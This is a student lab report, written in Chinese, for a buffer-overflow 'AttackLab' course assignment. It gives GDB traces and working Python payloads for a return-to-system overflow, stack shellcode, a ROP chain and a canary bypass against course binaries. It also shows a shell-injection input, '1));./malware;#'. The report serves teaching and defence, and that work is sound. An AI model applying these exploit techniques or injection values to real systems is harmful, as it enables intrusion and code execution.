# Lab3: AttackLab 实验报告
　
**实验环境**：Ubuntu 24.04.5 LTS（x86-64），GNU gdb 15.1，Python 3.12.3　　

## 0. 完成情况一览

| 任务 | 实现文件 | 预期输出 | 实际结果 |
| --- | --- | --- | --- |
| 观察 `input` 栈帧（报告 20 分） | 本报告第 2 节 | — | 已完成，含 GDB 实测数据 |
| 不同长度输入测试（报告 5 分） | 本报告第 3 节 | — | 已完成，含 16/20/32 字节实测 |
| 溢出执行 `./malware`（测试 25 + 报告 5） | `payload.py` | `You have successfully detonated the bomb! Congratulations!` | 通过（连续 5 次） |
| GDB 检查 `main` 机器码（报告 5 分） | 本报告第 5 节 | — | 已完成，含 `x`/`disas /r`/`si` 数据 |
| 栈空间执行（测试 25 + 报告 5） | `payload_dark.py` | `Hope A will be your grade!` | 通过（连续 5 次） |
| ROP（测试 10 + 报告 10） | `payload_rop.py` | `Hope A will be your grade!` | 通过（连续 5 次） |
| Canary（测试 10 + 报告 10） | `payload_canary.py` | `Hope A will be your grade!` | 通过（连续 5 次） |

四个 payload 均按仓库 `.github/workflows/lab3-checks.yml` 的方式运行：在仓库根目录用 `python3 payload*.py` 生成字节流，从 `attack/` 目录以该文件为 stdin 运行目标程序，再在 stdout 中检索期望字符串。`attack/` 下四个文件的 SHA-256 也与工作流中记录的数值完全一致，说明未修改实验资产。

## 1. 实验准备

- 调试器：`gdb ./dark-calc`，使用原生 GDB（未安装 GEF，输出为原生格式）。
- 关闭 core dump：`ulimit -c 0`，避免崩溃实验产生大文件。
- 注意：GDB 默认关闭 ASLR（`set disable-randomization on`），因此 GDB 中看到的栈地址在同一次调试中固定；直接用 shell 运行目标程序时 ASLR 正常开启，栈地址随机（见第 9 节 `aslr.c` 实验）。
- 本实验所用二进制都是非 PIE（`readelf -h` 显示 `Type: EXEC`），代码段地址固定；`dark-calc` 还通过 `init_fixed_stack()` 把调用栈固定映射到一个已知地址（见第 6 节）。

## 2. 观察 `input` 函数的调用栈（20 分）

### 2.1 实验操作

在 `attack/` 目录执行：

```text
$ gdb ./dark-calc
(gdb) break input
(gdb) run
(gdb) bt
(gdb) info registers rip rsp rbp
(gdb) x/6gx $rbp-0x10
(gdb) disas main
(gdb) disas input
```

断点实际停在 `input+4`（0x40197b，即 `sub $0x10,%rsp` 之前），此时函数序言的前两条指令已经执行完。实测输出（节选）：

```text
Breakpoint 1, 0x000000000040197b in input ()
===== BACKTRACE =====
#0  0x000000000040197b in input ()
#1  0x0000000000401ad1 in main ()
===== REGS =====
rip            0x40197b            0x40197b <input+4>
rsp            0x721000800fe0      0x721000800fe0
rbp            0x721000800fe0      0x721000800fe0
===== STACK AROUND RBP =====
0x721000800fd0:	0x0000000000000000	0x0000000000000000
0x721000800fe0:	0x0000721000800ff0	0x0000000000401ad1
0x721000800ff0:	0x00007fffffffeba0	0x0000000000401c1f
```

### 2.2 问题 1：`input` 是谁调用的？

`bt` 显示 `#1 0x401ad1 in main`，所以 `input` 是由 `main` 调用的。对照 `disas main`：

```text
   0x401ac3 <+0>:	push   %rbp
   0x401ac4 <+1>:	mov    %rsp,%rbp
   0x401ac7 <+4>:	mov    $0x0,%eax
   0x401acc <+9>:	call   0x401977 <input>
   0x401ad1 <+14>:	mov    $0x0,%eax
   0x401ad6 <+19>:	call   0x4019d7 <eval>
   0x401adb <+24>:	jmp    0x401ac7 <main+4>
```

调用点是 `main+9`（0x401acc）的 `call input`，返回地址是紧跟其后的 `main+14`（0x401ad1）。

补充观察：`bt` 到 `main` 就停止了，但 `main` 的栈帧里保存的返回地址是 `0x401c1f`（`__wrap_main+17`），而 `__wrap_main` 在 `call main` 之前把 `rsp` 切换到了固定栈（见第 6 节），所以基于 CFI 的回溯无法继续往上走。真正的调用链是 `__libc_start_main → __wrap_main → main → input`。

### 2.3 问题 2：`input` 前三条指令在做什么？`$rbp` 指向的内存值来自哪里？

`input` 的前三条指令（prologue）：

```text
   0x401977 <+0>:	push   %rbp          # 把调用者 main 的 rbp 压栈保存
   0x401978 <+1>:	mov    %rsp,%rbp     # 令 rbp 指向当前栈帧的“帧底”
   0x40197b <+4>:	sub    $0x10,%rsp   # 为局部变量 expression[16] 分配 16 字节
```

也就是“保存调用者的帧指针 → 建立自己的帧指针 → 为局部变量分配空间”。

断点停在 `sub` 之前，此时 `$rbp = 0x721000800fe0`，它指向的 8 字节是 `0x0000721000800ff0`，正是 `main` 的 `rbp`。这个值来自 `input` 的第一条 `push %rbp`：执行 `call input` 时 `rsp` 为 0x721000800ff0，`call` 把返回地址压到 0x721000800fe8，`rsp` 变成 0x721000800fe8；`push %rbp` 再把 `main` 的 `rbp`（0x721000800ff0）压到 0x721000800fe0，`rsp` 变成 0x721000800fe0；随后 `mov %rsp,%rbp` 令 `rbp = 0x721000800fe0`。而 `main` 的 `rbp` 又来自 `main` 自己的 `push %rbp; mov %rsp,%rbp`（0x401ac3–0x401ac4）。

### 2.4 问题 3：`$rbp + 8` 处是什么？

`$rbp + 8 = 0x721000800fe8`，值为 `0x0000000000401ad1`，即 `main+14`，也就是 `call input`（0x401acc）执行后压入的返回地址。`input` 执行 `ret` 时会跳回 `0x401ad1` 继续执行 `mov $0x0,%eax; call eval`。

### 2.5 问题 4：是哪条汇编把值写进 `$rbp + 8` 的？

在 `main+9`（0x401acc）下断点，重新运行并用 `si` 逐指令执行：

```text
Breakpoint 1, 0x0000000000401acc in main ()
===== BEFORE call input =====
rip 0x401acc   rsp 0x721000800ff0   rbp 0x721000800ff0
===== STEP INTO call =====
0x0000000000401977 in input ()
rip 0x401977   rsp 0x721000800fe8   rbp 0x721000800ff0
0x721000800fe8:	0x0000000000401ad1        <-- call 压入的返回地址
===== STEP push %rbp =====
rip 0x401978   rsp 0x721000800fe0   rbp 0x721000800ff0
0x721000800fe0:	0x0000721000800ff0        <-- push 保存的 main rbp
===== STEP mov %rsp,%rbp =====
rip 0x40197b   rsp 0x721000800fe0   rbp 0x721000800fe0
===== STEP sub $0x10,%rsp =====
rip 0x40197f   rsp 0x721000800fd0   rbp 0x721000800fe0
```

结论：写入该位置的指令是 `main` 中地址为 **0x401acc 的 `call input`**（机器码 `e8 a6 fe ff ff`）。`call` 先把下一条指令的地址 0x401ad1 压栈，随后 `input` 的 `push %rbp` 使栈指针再减 8，于是这个返回地址恰好位于 `$rbp + 8` 处。

### 2.6 问题 5：`call`、prologue、`leave`、`ret` 的作用

从 `input` 的 `leave`（0x4019d5）之前逐条执行到调用者：

```text
===== AT leave =====
rip 0x4019d5   rsp 0x721000800fd0   rbp 0x721000800fe0
0x721000800fe0:	0x0000721000800ff0	0x0000000000401ad1
0x721000800ff0:	0x00007fffffffeba0
===== STEP leave =====
rip 0x4019d6   rsp 0x721000800fe8   rbp 0x721000800ff0
===== STEP ret =====
0x0000000000401ad1 in main ()
rip 0x401ad1   rsp 0x721000800ff0   rbp 0x721000800ff0
```

- **`call`**：把返回地址（调用点下一条指令的地址）压栈，然后跳转到被调用函数。这一步建立“函数返回后回到哪里”的信息。
- **prologue**：`push %rbp; mov %rsp,%rbp; sub $0x10,%rsp`。先保存调用者的 `rbp`，再让 `rbp` 指向本帧基准，最后降低 `rsp` 给局部变量留空间。此后局部变量用 `rbp-偏移` 寻址（例如 `lea -0x10(%rbp),%rax` 就是 `expression`）。
- **`leave`**：等价于 `mov %rbp,%rsp; pop %rbp`。它丢弃本帧的局部变量区，恢复调用者的 `rbp`；实测 `rsp` 由 0x721000800fd0 变到 0x721000800fe8，`rbp` 由 0x721000800fe0 恢复为 0x721000800ff0。
- **`ret`**：从栈顶弹出返回地址送入 `rip`，同时 `rsp` 加 8；实测跳回 0x401ad1（`main+14`），`rsp` 回到 0x721000800ff0。控制流回到调用者。

这也解释了攻击原理：`expression` 缓冲区与 `input` 的返回地址之间只隔着 8 字节保存的 `rbp`，只要 `gets()` 写入超过 16 字节，就可以改写返回地址，从而在 `ret` 时劫持控制流。

## 3. 不同长度字符串输入测试（5 分）

`input()` 中 `char expression[MAXLEN+1]`，`MAXLEN = 15`，所以数组只有 16 字节；`gets()` 读到换行/EOF 才停，并额外写入一个 `\0`。`+1` 正是给字符串结尾的 `\0` 留的位置（C 字符串靠 `\0` 判定结尾）。

实测（正常 shell 运行，ASLR 开启）：

| 输入 | `gets` 实际写入 | 栈上被影响的范围 | 程序表现 |
| --- | --- | --- | --- |
| 16 个 `A` | 16+1 字节 | 只写满 `expression` 与它的结尾 `\0` | 正常：`echo $((AAAA…))` 后继续循环，EOF 时打印 `42_is_The_Ànswer` 并退出 0 |
| 20 个 `A` | 20+1 字节 | 写满缓冲区，并覆盖保存的 `rbp` 低 5 字节 | 未崩溃：返回地址完好，程序继续运行到最后 |
| 32 个 `A` | 32+1 字节 | 覆盖缓冲区、全部 8 字节保存 `rbp`、8 字节返回地址，并把 `\0` 写到 `rbp+16` | `Segmentation fault (core dumped)`，退出码 139 |

在 `gets` 调用之后（0x40199f）下断点观察 32 字节输入时的栈：

```text
===== AFTER gets, 32-byte input =====
rbp 0x721000800fe0   rsp 0x721000800fd0
0x721000800fd0:	0x4141414141414141	0x4141414141414141   <- expression[16] 填满
0x721000800fe0:	0x4141414141414141	0x4141414141414141   <- 保存的 rbp / 返回地址全被覆盖
0x721000800ff0:	0x00007fffffffeb00	0x0000000000401c1f
```

继续运行后，`leave` 弹出被破坏的 `rbp`，`ret` 取到 `0x4141414141414141`，CPU 跳转到该非法地址，触发 SIGSEGV，所以出现 Segmentation fault。

20 字节输入时的栈：

```text
0x721000800fd0:	0x4141414141414141	0x4141414141414141
0x721000800fe0:	0x0000720041414141	0x0000000000401ad1   <- 返回地址仍完好
```

保存的 `rbp` 变成 `0x0000720041414141`，但返回地址 `0x401ad1` 没有被破坏，所以 `input` 仍能正常返回；`main` 之后不再使用自己的 `rbp`（无限循环、最后由 `exit` 退出），因此程序没有崩溃。

结论：**超出 16 字节的数据会沿高地址方向依次覆盖保存的 `rbp`、返回地址以及调用者的栈帧**，这就是栈缓冲区溢出可以直接劫持控制流的原因。

## 4. 任务一：利用缓冲区溢出执行 `./malware`（测试 25 + 报告 5）

### 4.1 程序分析与攻击思路

`dark-calc.c` 的关键逻辑：

- `input()`：`char expression[16]`，`gets(expression)` 后 `strcpy(command_buf, expression)`；
- `eval()`：把 `command_buf` 包装成 `echo $(( … ))` 再交给 `system()`；
- `command_buf` 是全局数组（`MAXLEN+16 = 31` 字节），地址 `0x6030d0`。

`input()` 的栈帧布局（GDB 实测）：

| 地址/偏移 | 内容 |
| --- | --- |
| `rbp-0x10`（`expression`） | 缓冲区低 16 字节 |
| `rbp` | 保存的 `main` 的 `rbp`（8 字节） |
| `rbp+8` | `input` 的返回地址 |

因此从缓冲区开头到返回地址的偏移是 `0x10 + 0x8 = 24` 字节。

利用 `strcpy(command_buf, expression)` 发生在 `gets` 之后、`ret` 之前这一点，可以让 payload 的前 10 字节是 `"./malware\0"`：`strcpy` 只按字符串拷贝到 `\0` 为止，于是 `command_buf` 恰好变成字符串 `"./malware"`；`\0` 之后的填充字节和覆盖返回地址的 8 字节不会进入 `command_buf`。

然后把返回地址改成 `0x401a6b`，这是 `eval()` 内部的一段代码：

```text
   0x401a6b:	mov    $0x6030d0,%edi    # edi = command_buf
   0x401a70:	call   system@plt          # system("./malware")
```

不直接跳到 `system@plt` 是因为 `input` 的 `ret` 发生时 `rdi` 并不保证等于 `command_buf`；跳到 `eval+0x94` 可以复用程序自己的 `mov edi, command_buf`，让 `system` 的参数绝对正确。

### 4.2 `payload.py`

```python
#!/usr/bin/env python3
import struct
import sys

CMD = b"./malware\x00"                     # strcpy() 只复制到这里
RET2SYSTEM = 0x401A6B                      # mov edi, 0x6030d0; call system@plt

payload = CMD
payload += b"A" * (24 - len(payload))      # 16 字节缓冲区 + 8 字节保存的 rbp
payload += struct.pack("<Q", RET2SYSTEM)   # 覆盖 input() 的返回地址

sys.stdout.buffer.write(payload)
```

payload 共 32 字节：前 10 字节 `"./malware\0"`，再 14 个 `A` 填满 24 字节，最后是 8 字节小端地址 `0x401a6b`。

### 4.3 实际运行结果

```text
$ python3 payload.py > payload.bin
$ cd attack && ./dark-calc < ../payload.bin
```

stdout：

```text

### The bomb was triggered by the dark-calc process. ###
### You have successfully detonated the bomb! Congratulations! ###

Enter an expression (length up to 15):
```

`malware` 脚本通过 `ps` 沿父进程链找到了 `dark-calc`，因此打印了“bomb was triggered by the dark-calc process”。输出顺序看起来“反了”（提示语在后），是因为 `dark-calc` 的 stdout 是文件缓冲，`printf` 的提示先留在 stdio 缓冲区里，而 `malware` 由 `system()` 产生的 shell 直接写文件描述符；直到 `system` 返回后 0x401a75 处 `fflush(stdout)` 才把提示语刷出。

之后程序在 `leave` 处用被填充的 `rbp`（`0x4141414141414141`）恢复栈指针并崩溃（本机为 SIGBUS），但该崩溃发生在目标输出之后，不影响测试。服务器上缺少 `pstree` 命令时 `malware` 会打印一行 stderr，但脚本继续用 `ps` 完成判断，结果不受影响。

另：本任务也可以不利用溢出，直接在表达式中做 shell 注入（如输入 `1));./malware;#` 让 `eval` 拼出 `echo $((1));./malware;#))`），但这不符合“利用栈溢出漏洞”的要求，因此最终提交的是上面的溢出 payload。

## 5. 用 GDB 检查 `main` 的机器码（5 分）

### 5.1 问题 1：前三行汇编对应的机器码

在 `main` 第一行下断点，`disas /r main` 输出：

```text
   0x401ac3 <+0>:	55                 	push   %rbp
   0x401ac4 <+1>:	48 89 e5           	mov    %rsp,%rbp
   0x401ac7 <+4>:	b8 00 00 00 00     	mov    $0x0,%eax
   0x401acc <+9>:	e8 a6 fe ff ff     	call   0x401977 <input>
   0x401ad1 <+14>:	b8 00 00 00 00     	mov    $0x0,%eax
   0x401ad6 <+19>:	e8 fc fe ff ff     	call   0x4019d7 <eval>
   0x401adb <+24>:	eb ea              	jmp    0x401ac7 <main+4>
```

前三行对应的机器码：

| 地址 | 机器码 | 汇编 |
| --- | --- | --- |
| 0x401ac3 | `55` | `push %rbp` |
| 0x401ac4 | `48 89 e5` | `mov %rsp,%rbp` |
| 0x401ac7 | `b8 00 00 00 00` | `mov $0x0,%eax` |

### 5.2 问题 2：机器码在内存中的排列方式

用 `x/24bx 0x401ac3` 直接查看内存：

```text
0x401ac3 <main>:	0x55	0x48	0x89	0xe5	0xb8	0x00	0x00	0x00
0x401acb <main+8>:	0x00	0xe8	0xa6	0xfe	0xff	0xff	0xb8	0x00
0x401ad3 <main+16>:	0x00	0x00	0x00	0xe8	0xfc	0xfe	0xff	0xff
```

指令是按字节顺序、一条紧接一条连续存放在代码段里的，每条指令占用的区间如下：

| 内存区间 | 字节 | 含义 |
| --- | --- | --- |
| `0x401ac3` | `55` | `push %rbp`（1 字节） |
| `0x401ac4 – 0x401ac6` | `48 89 e5` | `mov %rsp,%rbp`（3 字节） |
| `0x401ac7 – 0x401acb` | `b8 00 00 00 00` | `mov $0x0,%eax`（5 字节；`b8` 后跟 32 位立即数，小端存放） |
| `0x401acc – 0x401ad0` | `e8 a6 fe ff ff` | `call input`（5 字节；`e8` 后跟 32 位相对偏移，小端 `0xfffffea6 = -0x15a`，0x401ad1-0x15a=0x401977） |

从 `main` 入口开始逐条 `si`，观察 `rip` 的变化也印证了这一点：

```text
0x401ac3 --> 0x401ac4 (push 执行完)
0x401ac4 --> 0x401ac7 (mov 执行完)
0x401ac7 --> 0x401acc (mov eax 执行完)
```

CPU 从 `rip` 开始按“取下一条指令所需的字节数”前进，因此只要把 `rip` 改到代码段中任意一条合法指令的起始地址，就能让程序执行该处开始的指令序列——这也是返回地址劫持、栈上代码执行和 ROP 的基础。

## 6. 任务二：栈空间执行（测试 25 + 报告 5）

### 6.1 被“营造”出来的可执行固定栈

`readelf -lW attack/dark-calc | grep GNU_STACK` 显示 `GNU_STACK ... RW`，即程序自己的栈不可执行；但 `dark-calc` 的 `.init_array` 里注册了 `init_fixed_stack()`，它在 `main` 运行前做了：

1. `mmap(0x721000000000, 0x802000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED_NOREPLACE, -1, 0)`：在固定地址申请 8 MB 可读可写可执行区域；
2. `mprotect` 把首尾各一页设为 `PROT_NONE`，作为越界防护页；
3. 把 `fixed_stack_top = 0x721000801000` 存到全局变量。

`__wrap_main` 则把 `rsp` 切换过去再调用 `main`：

```text
0x401c0e <__wrap_main>: push %r12
0x401c10:              mov  %rsp,%r12
0x401c13:              mov  fixed_stack_top,%rsp   # rsp = 0x721000801000
0x401c1a:              call main
```

GDB 的 `info proc mappings` 直接印证了这一点：

```text
0x721000000000  0x721000001000  ---p      <- 底部防护页
0x721000001000  0x721000801000  rwxp      <- 可读可写可执行的固定栈
0x721000801000  0x721000802000  ---p      <- 顶部防护页
```

所以 `dark-calc` 的栈既是**固定地址**（不受 ASLR 影响），又是**可执行**的——这正是题面所说“故意营造出来的假象”。在 `input` 断点处实测：

```text
rbp=0x721000800fe0  expression=0x721000800fd0  rsp=0x721000800fd0
```

即 `expression` 永远位于 `0x721000800fd0`，可以硬编码到 payload 里。

### 6.2 shellcode 设计

目标是调用 `grade_eval(4)`，让 `grade_eval` 打印 “Hope A will be your grade!”。x86-64 参数传递用 `rdi`，所以 shellcode 为：

```text
bf 04 00 00 00                  mov    $0x4,%edi          # grade = 4
48 b8 87 1a 40 00 00 00 00 00   movabs $0x401a87,%rax     # grade_eval 地址
ff d0                           call   *%rax
0f 0b                           ud2                        # 打印完主动终止
```

- 地址 `0x401a87` 来自 `nm dark-calc`（`T grade_eval`）。
- 不能使用 `call rel32`：栈在 `0x721000800fd0`，代码在 `0x401a87`，两者相距约 125 TB，远超 32 位相对偏移 ±2 GB 的范围，因此必须用 `movabs` 把 64 位绝对地址装入寄存器再 `call *%rax`。
- 末尾 `ud2` 触发非法指令信号，避免执行到缓冲区外的垃圾数据；此时 `grade_eval` 已经 `printf` 且 `fflush` 过，输出不受影响。

### 6.3 payload 布局与 `payload_dark.py`

| 偏移 | 内容 |
| --- | --- |
| 0 – 18 | 19 字节 shellcode |
| 19 – 23 | `0x90`（NOP）填充到 24 字节 |
| 24 – 31 | `0x721000800fd0`（覆盖返回地址，指回缓冲区开头） |

```python
#!/usr/bin/env python3
import struct
import sys

BUF = 0x721000800FD0       # expression[] 在固定栈上的地址
GRADE_EVAL = 0x401A87      # void grade_eval(int grade)

shellcode = (
    b"\xbf\x04\x00\x00\x00"                       # mov edi, 4
    + b"\x48\xb8" + struct.pack("<Q", GRADE_EVAL) # movabs rax, grade_eval
    + b"\xff\xd0"                                 # call rax
    + b"\x0f\x0b"                                 # ud2
)

payload = shellcode.ljust(24, b"\x90")
payload += struct.pack("<Q", BUF)

sys.stdout.buffer.write(payload)
```

执行 `ret` 后 `rip = 0x721000800fd0`，CPU 直接在栈上取指执行；`call *%rax` 进入 `grade_eval` 时 `rsp = 0x721000800fe8`，低 4 位为 8，满足 System V ABI 对函数入口 16 字节对齐的要求。

### 6.4 实际运行结果

```text
Enter an expression (length up to 15):

^[[31m Hope A will be your grade! 
```

程序随后因 `ud2` 收到 SIGILL（退出码 132），但目标字符串已经打印。连续运行 5 次全部通过。

## 7. 任务三：ROP（测试 10 + 报告 10）

### 7.1 防护状态

`dark-calc-nx` 与 `dark-calc` 不同：

- 没有 `init_fixed_stack`/`__wrap_main`，使用普通栈：`GNU_STACK ... RW`，栈**不可执行**（NX）；
- `Type: EXEC`，非 PIE，代码段地址固定；
- 正常运行时栈地址受 ASLR 随机化。

因此既不能像任务二那样把 `rip` 指向栈上的机器码（会触发 NX），也不能硬编码栈地址。解决办法是 **ROP**：在栈上只放数据（返回地址链），把控制流串到代码段中已有的 gadget 上。栈本身是可读可写的，随便 ASLR 怎么变，链中使用的 gadget/函数地址都在固定的非 PIE 代码段里，不受影响。

注意：`input` 的栈帧结构相同（`expression` 在 `rbp-0x10`），返回地址位于 payload 偏移 24 处。

### 7.2 在提示区间内找 gadget

题面提示 gadget 在 `0x4019d0 – 0x401ae3` 之间。用 `objdump -d -M intel dark-calc-nx` 查看 `__libc_csu_init`，并用 `x/4bx` 验证字节：

```text
0x401a33 <__libc_csu_init+99>:	0x5f	0xc3	0x90	0x66
0x401a33:	pop    %rdi
0x401a34:	ret
```

`__libc_csu_init` 末尾 `pop %r15; ret` 的字节是 `41 5f c3`，从第二个字节 `0x401a33` 开始看就是 `5f c3`，即 **`pop rdi; ret`**；`0x401a34` 则是单独的 **`ret`**。

区间内还有另一个 `pop rdi; ret`：`.rodata` 里字符串 `42_is_The_Ànswer` 的 `À` 编码为 `c3 80`，前面的 `_` 是 `0x5f`，于是 `0x401a79` 处也是 `5f c3`（`x/2i 0x401a79` 确认）。这说明 gadget 并不要求是“完整的函数指令”，任何字节序列只要能被 CPU 从中间开始解码并最终遇到 `c3`，都可以使用。本 payload 采用 `0x401a33`（位于提示区间内，且来自 `.text`）。

### 7.3 构造 ROP 链与栈对齐

目标是 `grade_eval(4)`，调用约定要求 `rdi = 4`：

| 栈上位置（payload 偏移） | 值 | 作用 |
| --- | --- | --- |
| 0 – 23 | `A` × 24 | 填满缓冲区与保存的 `rbp` |
| 24 | `0x401a34` | `input` 的 `ret` 跳到 `ret` gadget（对齐用） |
| 32 | `0x401a33` | `pop rdi; ret` |
| 40 | `4` | 弹出到 `rdi` |
| 48 | `0x401978` | `grade_eval` 入口 |
| 56 | `0x4016e0` | `exit@plt`，打印后干净退出 |

关于多出来的第一个 `ret`：System V ABI 要求在 `call` 之后进入函数时 `rsp % 16 == 8`（`call` 压入 8 字节）。`input` 的 `ret` 之后 `rsp` 恰为 16 的倍数，若直接 `pop rdi` 再 `ret` 进 `grade_eval`，进入时 `rsp % 16 == 0`，部分 glibc 的 `printf` 会因内部 `movaps` 要求 16 字节对齐而崩溃。多塞一个 `ret` 就能翻转 8 字节的奇偶，使 `grade_eval` 入口对齐；本机测试中两种写法都能打印，但按题面提示统一采用对齐版本，可移植性更好。

### 7.4 `payload_rop.py`

```python
#!/usr/bin/env python3
import struct
import sys

p64 = lambda x: struct.pack("<Q", x)

RET = 0x401A34        # ret（对齐）
POP_RDI = 0x401A33    # pop rdi ; ret
GRADE_EVAL = 0x401978 # grade_eval(int)
EXIT_PLT = 0x4016E0   # exit@plt

payload = b"A" * 24
payload += p64(RET) + p64(POP_RDI) + p64(4) + p64(GRADE_EVAL) + p64(EXIT_PLT)

sys.stdout.buffer.write(payload)
```

### 7.5 实际运行结果

```text
$ python3 payload_rop.py > rop.bin
$ cd attack && ./dark-calc-nx < ../rop.bin
Enter an expression (length up to 15):

^[[31m Hope A will be your grade! 
```

退出码 16（`grade_eval` 返回后 `rdi` 恰好是 stdout 指针，`exit@plt` 以其低字节作为状态码），没有崩溃。连续 5 次、ASLR 开启下全部通过。

## 8. 任务四：Canary（测试 10 + 报告 10）

### 8.1 `dark-log` 的栈帧与 Canary

`dark-log` 编译时开启了 Stack Protector（反汇编里能看到 `fs:0x28` 的读取/比较以及 `__stack_chk_fail@plt`）。`input()` 中 `struct log_frame` 的布局与实测偏移：

| 偏移（相对 `rbp`） | 成员 | 说明 |
| --- | --- | --- |
| `rbp-0x120` | `char expression[128]` | `gets()` 写入的目标 |
| `rbp-0x0a0` | `char logMsg[128]` | `memcpy` 写入的目标 |
| `rbp-0x020` | `int len` | memcpy 目标偏移，攻击者能改到的最后一个字段 |
| `rbp-0x01c` | `char pad[8]` + 编译器填充 | |
| `rbp-0x008` | Canary | `fs:0x28` 的随机值 |
| `rbp` | 保存的 `rbp` | |
| `rbp+0x008` | 返回地址 | |

函数里关键代码是（编译器把固定长度 `memcpy` 展开成 16 条 `mov`）：

```text
rax = f.len + (rbp-0x120) + 0x80      # = &logMsg + f.len
memcpy(&logMsg + f.len, f.expression, 128);
```

若直接让 `gets()` 一直写到返回地址，必然先踩坏 Canary（偏移 280），函数在 `leave` 前会调用 `__stack_chk_fail` 终止。但 `gets` 只需要写到 `len` 字段（偏移 256–259）就停手，就**刚好停在 Canary 之前**：`gets` 写入 260 字节后遇到换行/EOF 终止，并在偏移 260 写入 `\0`（落在 pad 中），Canary 完全未被触碰。

### 8.2 利用 `memcpy` 越过 Canary

把 `len` 改成 `0xa8 = 168`，则 `memcpy` 的目的地址为：

```text
&logMsg + 168 = (rbp-0xa0) + 0xa8 = rbp + 8
```

即 `memcpy` 会把 `expression[0..127]` 这 128 字节直接覆盖到 **返回地址及其上方的栈**，而完全不经过 Canary。于是：

- Canary 保持原值 → 校验通过；
- 返回地址被换成 ROP 链的第一项；
- `rbp+16` 起的高地址刚好容纳后续 ROP 链。

GDB 实测（在 `gets` 后、`memcpy` 前和 `memcpy` 后各断一次）：

```text
===== gets 之后（memcpy 之前） =====
expression @ 0x7fffffffe9b0: 0x00000000004018a4  0x00000000004018a3 ...
logMsg     @ 0x7fffffffea30: 0x4343434343434343
len        @ 0x7fffffffeab0: 0x00000000000000a8
canary     @ 0x7fffffffeac8: 0x2d2b7a98071bc400
saved rbp / ret @ 0x7fffffffead0: 0x00007fffffffeaf0  0x0000000000401811

===== memcpy 之后 =====
canary     @ 0x7fffffffeac8: 0x2d2b7a98071bc400   <-- 完全没有变化
ret        @ 0x7fffffffead8: 0x00000000004018a4   <-- 已被覆盖为 ROP 链
0x7fffffffeae8: 0x0000000000000004  0x0000000000401677
0x7fffffffeaf8: 0x0000000000000000  0x4242424242424242
```

### 8.3 链的设计与 `payload_canary.py`

gadget 与前面的思路相同，只是地址换成 `dark-log` 自己的：

```text
0x4018a4: ret                (对齐)
0x4018a3: pop rdi ; ret      (__libc_csu_init 末尾 pop %r15; ret 的第二个字节)
0x401677: grade_eval
```

payload 分三段：`expression[128]`（开头放 ROP 链，其余用 `B` 填充）+ `logMsg[128]`（`C`）+ `len = 0xa8`，共 260 字节，末尾不写换行（EOF 终止 `gets`，不会再额外写入一个字节）。

```python
#!/usr/bin/env python3
import struct
import sys

p64 = lambda x: struct.pack("<Q", x)
p32 = lambda x: struct.pack("<I", x)

RET = 0x4018A4        # ret（对齐）
POP_RDI = 0x4018A3    # pop rdi ; ret
GRADE_EVAL = 0x401677 # grade_eval(int)

chain = p64(RET) + p64(POP_RDI) + p64(4) + p64(GRADE_EVAL) + p64(0)
payload = bytearray(chain.ljust(128, b"B"))   # expression[128]
payload += b"C" * 128                         # logMsg[128]
payload += p32(0xA8)                          # len = 168 => memcpy 目标 rbp+8

sys.stdout.buffer.write(payload)
```

返回地址被 `memcpy` 改成 `0x4018a4` 后，`input` 先通过 Canary 校验，再 `leave; ret` 进入 ROP 链：`ret` 对齐 → `pop rdi` 弹出 4 → `grade_eval(4)`。`grade_eval` 末尾同样会做一次 Canary 校验，但它的 Canary 一直没被破坏，所以能正常打印并 `fflush`。链尾的 `0` 让 `grade_eval` 返回后立刻崩溃，此时输出已经刷出，不影响测试。

### 8.4 实际运行结果

```text
$ python3 payload_canary.py > canary.bin
$ cd attack && ./dark-log < ../canary.bin
Enter a log message:

^[[31m Hope A will be your grade! 
```

随后 SIGSEGV（退出码 139），但目标字符串已经打印。连续 5 次、ASLR 开启下全部通过。

### 8.5 思考：重排局部变量能否防住这种攻击？

可以防住“本题这种”利用，但不能只靠重排解决 `gets()` 的越界问题。本题之所以能绕开 Canary，是因为两个条件同时成立：

1. `gets` 从低地址往高地址顺序写，`len` 字段位于缓冲区与 Canary 之间，攻击者可以在**不触碰 Canary** 的情况下改掉它；
2. 随后程序用这个被改掉的 `len` 作为 `memcpy` 的偏移，把数据从低地址缓冲区“搬运”到 Canary 之后。

编译器如果能自由重排局部变量，应当把**标量/长度/指针等控制数据放在所有字符数组的低地址一侧**，把 `expression`、`logMsg` 这类字符数组放在紧邻 Canary 的高地址一侧。这样：

- `gets` 越界写会先撞上 Canary，而不是先撞上 `len`，修改 `len` 必须先通过 Canary 校验；
- 即使 `len` 被改，攻击者也无法在不破坏 Canary 的前提下用 `memcpy` 把数据搬到返回地址。

同时还要配合正确的代码写法：把 `memcpy` 的长度改为 `sizeof(f.logMsg)` 并校验 `f.len` 的范围（本题 `len` 恒为 0，本不该是结构体成员），从根本上避免把用户可控的偏移用作写目标。更彻底的做法是用 `fgets(f.expression, sizeof(f.expression), stdin)` 取代 `gets`，并开启 `-fstack-protector-strong`、`_FORTIFY_SOURCE` 和 PIE/ASLR；只要存在一个可控的越界写，Canary 也只能做到“被破坏时报警”，而不能阻止破坏发生。

## 9. ASLR 小实验（`aslr.c`）

在 `src/` 目录用 `cc -o aslr aslr.c` 编译后连续运行 5 次，打印局部变量 `i` 的地址：

```text
0x7ffcaffbc354
0x7ffe7ead1104
0x7ffe418e3144
0x7ffdfd5062b4
0x7ffd65842b54
```

每次地址都不同，说明 Linux 默认开启了 ASLR，栈的基址随进程随机。这也解释了为什么任务二必须依赖 `dark-calc` 特意提供的固定栈、任务三必须用非 PIE 代码段里的 ROP gadget，而不能像在 GDB 里那样硬编码栈地址（GDB 为方便调试默认关闭 ASLR，所以 GDB 中多次运行地址相同是正常现象）。

## 10. 防护机制总结

| 机制 | 作用 | 本次实验中如何被绕过/利用 |
| --- | --- | --- |
| 栈不可执行（NX） | 数据页不可取指，阻止在栈上执行 shellcode | `dark-calc` 通过 `init_fixed_stack` 故意 `mmap` 出固定 RWX 栈；`dark-calc-nx`/`dark-log` 上改用 ROP 复用代码段 |
| ASLR | 随机化栈/库/堆等地址 | `dark-calc` 的固定栈不受影响；`dark-calc-nx`/`dark-log` 的 ROP 只使用非 PIE 固定代码地址 |
| Stack Protector | 函数返回前校验 Canary，发现栈破坏即终止 | `dark-log` 中利用 `gets` 只写到 `len` 字段、再由 `memcpy` 用被改的 `len` 越过 Canary 写返回地址 |
